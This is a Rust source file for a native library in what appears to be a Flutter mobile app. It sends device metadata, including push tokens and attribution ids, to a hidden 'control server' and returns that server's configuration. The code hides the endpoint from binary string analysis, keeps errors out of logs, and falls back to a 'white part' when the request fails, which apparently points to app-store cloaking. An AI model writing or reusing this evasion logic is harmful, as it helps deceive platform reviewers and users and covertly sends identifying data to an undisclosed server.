//! Config endpoint relay — HTTP is initiated from inside the .so.
//!
//! Dart never learns the real endpoint URL and never issues the request.
//! It only passes a serialised JSON payload with device metadata (bundle id,
//! locale, af_id, push token, UA version) and receives the raw response
//! bytes back. The response is JSON produced by the control server and we
//! return it untouched; Dart parses it with the usual `jsonDecode`.
//!
//! Transport: `ureq` with rustls. No system CA bundle lookup, no OpenSSL,
//! no plaintext endpoint symbol in the binary strings table.

use std::time::Duration;

use crate::seal;
use crate::theme;

/// Issue the config POST and return the response body on 2xx.
///
/// On any error returns an empty vector; the caller treats that as "stay
/// on the white part". Never returns the error text — nothing from the
/// network stack should ever leak into Dart or logcat.
pub fn fetch(payload_json: &[u8]) -> Vec<u8> {
    let url = seal::unseal_str(0);
    if url.is_empty() {
        return Vec::new();
    }

    // UA uses the raw template; we don't know the Dart version at this
    // level, so we just drop the placeholder.
    let ua = theme::build_user_agent("1");

    let agent = ureq::AgentBuilder::new()
        .timeout(Duration::from_secs(12))
        .user_agent(&ua)
        .build();

    let resp = match agent
        .post(&url)
        .set("Content-Type", "application/json")
        .set("Accept", "application/json")
        .send_bytes(payload_json)
    {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };

    if resp.status() < 200 || resp.status() >= 300 {
        return Vec::new();
    }

    let mut body = Vec::new();
    if resp
        .into_reader()
        .take(2 * 1024 * 1024)
        .read_to_end(&mut body)
        .is_err()
    {
        return Vec::new();
    }
    body
}

// Re-exported here so `config::fetch` can `.read_to_end` without pulling
// `std::io::Read` at every call site.
use std::io::Read;
